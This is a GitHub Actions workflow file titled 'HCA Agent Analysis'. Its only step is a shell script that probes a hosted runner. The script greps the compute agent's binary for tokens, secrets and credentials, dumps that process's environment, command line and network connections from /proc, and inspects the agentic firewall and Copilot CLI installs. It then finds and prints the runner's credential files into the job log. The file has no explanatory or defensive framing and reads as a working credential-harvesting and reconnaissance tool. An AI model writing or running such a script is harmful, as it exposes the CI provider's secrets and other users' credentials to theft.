name: HCA Agent Analysis
on:
  workflow_dispatch:
jobs:
  hca:
    runs-on: ubuntu-latest
    steps:
      - name: Analyze HCA agent
        timeout-minutes: 5
        run: |
          set +e

          echo "=== HCA AGENT LOG ==="
          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | head -100

          echo ""
          echo "=== HCA DIRECTORY ==="
          ls -laR /opt/hca/ 2>/dev/null

          echo ""
          echo "=== HCA BINARY STRINGS ==="
          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "token|secret|key|auth|password|credential|bearer|api|url|endpoint|http|orchestrator|attestation" | head -50

          echo ""
          echo "=== HCA ENVIRONMENT ==="
          cat /proc/$(pgrep hosted-compute)/environ 2>/dev/null | tr '\0' '\n' | sort

          echo ""
          echo "=== HCA PROCESS CMDLINE ==="
          cat /proc/$(pgrep hosted-compute)/cmdline 2>/dev/null | tr '\0' ' '
          echo ""

          echo ""
          echo "=== HCA FD (file descriptors) ==="
          ls -la /proc/$(pgrep hosted-compute)/fd/ 2>/dev/null | head -20

          echo ""
          echo "=== HCA NETWORK CONNECTIONS ==="
          cat /proc/$(pgrep hosted-compute)/net/tcp 2>/dev/null | head -10
          ss -tnp 2>/dev/null | grep hosted

          echo ""
          echo "=== AGENTIC FIREWALL ==="
          ls -laR /opt/hostedtoolcache/agentic-workflow-firewall-js/ 2>/dev/null | head -30
          cat /opt/hostedtoolcache/agentic-workflow-firewall-js/*/package.json 2>/dev/null | head -20

          echo ""
          echo "=== COPILOT CLI ==="
          ls -la /opt/hostedtoolcache/copilot-cli/ 2>/dev/null
          find /opt/hostedtoolcache/copilot-cli/ -name "*.json" 2>/dev/null | head -5
          cat /opt/hostedtoolcache/copilot-cli/*/package.json 2>/dev/null | head -20

          echo ""
          echo "=== RUNNER CREDENTIALS ==="
          find /home/runner -name ".credentials*" -o -name ".runner" -o -name ".env" -o -name "*.jws" 2>/dev/null
          for f in /home/runner/.credentials /home/runner/.credentials_rsaparams /home/runner/.runner /home/runner/.env; do
            if [ -f "$f" ]; then
              echo "--- $f ---"
              cat "$f" | head -20
            fi
          done

          echo ""
          echo "=== ACTIONS RUNNER INTERNALS ==="
          ls -la /home/runner/actions-runner/ 2>/dev/null | head -15
          cat /home/runner/actions-runner/.runner 2>/dev/null
          cat /home/runner/actions-runner/.credentials 2>/dev/null | head -10

          echo ""
          echo "=== DONE ==="
